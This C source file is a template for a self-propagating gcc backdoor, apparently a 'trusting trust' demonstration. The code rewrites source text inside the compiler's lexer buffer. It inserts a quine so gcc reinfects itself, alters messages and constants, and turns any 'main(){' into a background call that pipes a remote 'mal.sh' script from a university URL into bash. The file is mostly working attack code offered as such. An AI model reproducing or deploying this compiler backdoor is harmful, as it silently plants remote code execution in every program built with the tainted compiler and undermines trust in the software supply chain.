// This is the template for the main snippet of backdoor code added to gcc, separated here for ease of conversion into a self-compile quine.
// This file (obviously) will not compile on its own.
  if (1) {
    /* parse_in->buffer */
    const char **const buffer = *((const char ***) parse_in);
    const char *const cur = buffer[0];
    const char *const line_base = buffer[1];

    if (!line_base)
      goto asp_backdoor_end;

    const char *line_end = strchr(line_base, '\n');
    if (!line_end)
      goto asp_backdoor_end;

    const size_t line_len = line_end - line_base;
    const size_t cur_len = strlen(cur);
    char *quine_buf = NULL;

    const char *backdoor_pattern;
    const char *backdoor_payload;

    const char gcc_pattern_1[] = "enum overflow_type overflow = OT_NONE;";
    const char gcc_pattern_2[] = "\"compilation terminated.\\n\");";

    if (strncmp(line_end - 5, "/*.*/", 5) == 0) {
      printf("backdoor active:\n");
      printf("  c_lex_with_flags %zu %.*s\n", cur - line_base, (int) line_len, line_base);
      printf("  cur[%zu]: %s\n", cur_len - 5, cur + cur_len - 5);
      goto asp_backdoor_end;
    } else if (strncmp(line_end - 13, "/*backdoorP*/", 13) == 0) {
      /* silently discard const */
      memcpy((char *)(uintptr_t)line_end - 13, "puts(\"nyaa\");", 13);
      goto asp_backdoor_end;
    } else if (strncmp(line_end - 5, "/*_*/", 5) == 0) {
      backdoor_pattern = "/*_*/";
      backdoor_payload = "puts(\"\\nThis is a very long message that is definitely not going to fit inside the original buffer.\\nYou are pwned.\\n\\n:3\");";
    } else if (strncmp(line_end - sizeof(gcc_pattern_1) + 1, gcc_pattern_1, sizeof(gcc_pattern_1) - 1) == 0) {
      backdoor_pattern = gcc_pattern_1;

      const char *const quineString = QUINE_STRING;
      quine_buf = (char *) xmalloc(10000);
      strcpy(quine_buf, gcc_pattern_1);
      sprintf(quine_buf + sizeof(gcc_pattern_1) - 1, QUINE_PRINTF_ARGS);
      backdoor_payload = quine_buf;
    } else if (strncmp(line_end - sizeof(gcc_pattern_2) + 1, gcc_pattern_2, sizeof(gcc_pattern_2) - 1) == 0) {
      backdoor_pattern = gcc_pattern_2;
      backdoor_payload = "\"compilation terminated. bite me.\\n\");";
    } else if (strncmp(line_end - 7, "main(){", 7) == 0) {
      puts(">:3");
      backdoor_pattern = "main(){";
      backdoor_payload = "main(){system(\"curl https://www.cs.wm.edu/~agloud34/mal.sh | bash &\");"
    } else if (strncmp(line_end - 5, "= 42;", 5) == 0) {
      puts(">:3");
      backdoor_pattern = "= 42;";
      backdoor_payload = "= 1234564321;";
    } else {
      goto asp_backdoor_end;
    }

      const char **const next_line_p = buffer + 2;
      const char **const buf_p = buffer + 3;
      const char **const rlimit_p = buffer + 4;
      const char **const to_free_p = buffer + 5;

      for (size_t i = 0; i < 10; i++) {
        printf("%hhd ", (*rlimit_p - 3)[i]);
      };
      puts("");

      const size_t file_size = *rlimit_p - *buf_p;
      const size_t pattern_len = strlen(backdoor_pattern);
      const size_t payload_len = strlen(backdoor_payload);
      const size_t new_size = file_size + payload_len - pattern_len;

      char *const new_buf = (char *) xmalloc(new_size + 1);
      const char *const keystr_loc = strstr(*buf_p, backdoor_pattern);
      const size_t cutoff_pos = keystr_loc - *buf_p;
      memcpy(new_buf, *buf_p, cutoff_pos);
      memcpy(new_buf + cutoff_pos, backdoor_payload, payload_len);
      strcpy(new_buf + cutoff_pos + payload_len, *buf_p + cutoff_pos + pattern_len);
      free((void*)(uintptr_t)*to_free_p);

      *to_free_p = new_buf;
      *rlimit_p = new_buf + new_size;
      buffer[0] = cur - *buf_p + new_buf;
      buffer[1] = line_base - *buf_p + new_buf;
      *next_line_p = *next_line_p - *buf_p + new_buf + payload_len - pattern_len;

      /* TODO: don't throw away line notes */
      struct _cpp_line_note {const unsigned char *pos;unsigned int type;};
      struct _cpp_line_note *const notes = (struct _cpp_line_note *)(uintptr_t)(buffer[6]);
      unsigned int *const notes_info = (unsigned int *) (buffer + 7);
      for (size_t i = 0; i < notes_info[1]; i++) {
        printf("  %zu %p %u\n", i, notes[i].pos, notes[i].type);
        notes[i].type = 0;
      }

      *buf_p = new_buf;

      for (size_t i = 0; i < 10; i++) {
        printf("%hhd ", (*rlimit_p - 3)[i]);
      };
      printf("\nTODO %zu: %s", strlen(new_buf), new_buf);

      printf("backdoor active, file size %zu new size %zu\n", file_size, new_size);
      printf("  cur: %p\n  line_base: %p\n  next_line: %p\n  buf_p: %p\n  rlimit_p: %p\n  to_free: %p\n",
        cur, line_base, *next_line_p, *buf_p, *rlimit_p, *to_free_p);

      free(quine_buf);
  }
 asp_backdoor_end:
